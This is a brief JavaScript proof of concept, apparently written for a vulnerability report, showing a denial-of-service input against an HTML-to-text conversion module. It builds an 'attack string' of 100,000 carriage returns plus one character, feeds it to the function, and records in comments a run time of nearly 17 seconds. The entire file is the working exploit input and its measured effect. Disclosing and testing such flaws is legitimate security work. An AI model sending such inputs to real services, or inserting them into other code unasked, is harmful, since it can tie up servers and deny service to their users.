const htmlToText = require("./jsHtmlToText.js");

//Attack String :""+"\r"*100000+"A"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "\r";
}
str += "A";

var result = htmlToText(str, false);

// real    0m16.768s
// user    0m16.719s
// sys     0m0.030s